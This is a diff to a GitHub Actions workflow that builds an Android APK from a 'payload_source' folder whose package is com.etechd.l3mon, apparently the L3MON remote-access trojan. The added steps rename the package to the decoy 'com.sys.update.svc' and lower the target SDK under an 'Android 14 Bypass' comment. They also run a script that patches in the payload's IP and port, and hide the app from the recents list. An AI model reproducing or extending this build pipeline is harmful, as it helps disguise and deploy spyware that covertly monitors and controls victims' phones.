@@ -24,10 +24,38 @@ jobs:
           wget https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar -O apktool.jar
           wget https://github.com/patrickfav/uber-apk-signer/releases/download/v1.3.0/uber-apk-signer-1.3.0.jar -O sign.jar
 
-      - name: Run Obfuscation Script
+      - name: Manual Source Patching
         run: |
-          chmod +x obfuscate.sh
-          ./obfuscate.sh
+          OLD_PKG="com.etechd.l3mon"
+          NEW_PKG="com.sys.update.svc"
+          OLD_PATH="com/etechd/l3mon"
+          NEW_PATH="com/sys/update/svc"
+
+          # 1. Package Rename
+          OLD_PKG_ESC=$(echo "$OLD_PKG" | sed 's/\./\\./g')
+          find payload_source -type f -exec sed -i "s|$OLD_PKG_ESC|$NEW_PKG|g" {} +
+          find payload_source -type f -exec sed -i "s|$OLD_PATH|$NEW_PATH|g" {} +
+
+          mkdir -p "payload_source/smali/$NEW_PATH"
+          if [ -d "payload_source/smali/$OLD_PATH" ]; then
+            mv payload_source/smali/$OLD_PATH/* "payload_source/smali/$NEW_PATH/"
+            rm -rf "payload_source/smali/com/etechd"
+          fi
+
+          # 2. Update SDK (Android 14 Bypass)
+          sed -i 's/minSdkVersion: .*/minSdkVersion: 26/g' payload_source/apktool.yml
+          sed -i 's/targetSdkVersion: .*/targetSdkVersion: 31/g' payload_source/apktool.yml
+          sed -i 's/minSdkVersion="[0-9]*"/minSdkVersion="26"/g' payload_source/AndroidManifest.xml
+          sed -i 's/targetSdkVersion="[0-9]*"/targetSdkVersion="31"/g' payload_source/AndroidManifest.xml
+
+          # 3. Dynamic IP/Port Patching
+          chmod +x patch_payload.sh
+          sed -i "s|$OLD_PATH/|$NEW_PATH/|g" patch_payload.sh
+          ./patch_payload.sh
+
+          # 4. Manifest Fix
+          sed -i "s|com.etechd.l3mon.MainActivity|com.sys.update.svc.MainActivity|g" payload_source/AndroidManifest.xml
+          sed -i 's/android:name="com.sys.update.svc.MainActivity"/android:name="com.sys.update.svc.MainActivity" android:excludeFromRecents="true"/g' payload_source/AndroidManifest.xml
 
       - name: Build APK
         run: |
